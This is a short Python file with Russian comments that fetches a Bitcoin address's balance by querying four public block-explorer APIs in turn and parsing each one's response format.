import time
import requests

BTC_APIS = [
    "https://blockchain.info/rawaddr/{addr}?limit=0",               # API №1
    "https://blockstream.info/api/address/{addr}",                  # API №2
    "https://mempool.space/api/address/{addr}",                     # API №3
    "https://sochain.com/api/v2/get_address_balance/BTC/{addr}",    # API №4
]


def btc_get_balance(addr):
    """Пробует 4 API по очереди, пока не получит валидный ответ."""
    for api in BTC_APIS:
        url = api.format(addr=addr)

        try:
            r = requests.get(url, timeout=10)

            # Пустой ответ → пропускаем
            if not r.text.strip():
                continue

            # API 1 — blockchain.info
            if "blockchain.info" in api:
                data = r.json()
                return data.get("final_balance", 0) / 1e8

            # API 2 — blockstream.info
            if "blockstream" in api:
                data = r.json()
                chain_stats = data.get("chain_stats", {})
                mempool_stats = data.get("mempool_stats", {})
                sats = chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)
                sats += mempool_stats.get("funded_txo_sum", 0) - mempool_stats.get("spent_txo_sum", 0)
                return sats / 1e8

            # API 3 — mempool.space
            if "mempool.space" in api:
                data = r.json()
                chain_stats = data.get("chain_stats", {})
                mempool_stats = data.get("mempool_stats", {})
                sats = chain_stats.get("funded_txo_sum", 0) - chain_stats.get("spent_txo_sum", 0)
                sats += mempool_stats.get("funded_txo_sum", 0) - mempool_stats.get("spent_txo_sum", 0)
                return sats / 1e8

            # API 4 — sochain
            if "sochain" in api:
                data = r.json()
                if data.get("status") == "success":
                    return float(data["data"]["confirmed_balance"])

        except Exception:
            continue  # пробуем следующий API

    return 0  # если все API упали


